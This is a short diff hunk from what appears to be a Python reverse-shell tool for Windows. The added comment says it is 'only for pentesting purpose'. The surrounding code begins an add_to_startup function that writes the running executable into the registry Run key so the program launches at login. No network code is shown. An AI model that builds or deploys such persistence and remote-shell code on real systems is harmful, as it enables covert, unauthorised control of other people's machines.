@@ -63,6 +63,8 @@ import os
 import sys
 import winreg
 
+#Reverse shell only for pentesting purpose! illegal use is not supported and restricted as much as possible.
+
 def add_to_startup():
     exe_path = sys.executable
     key = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
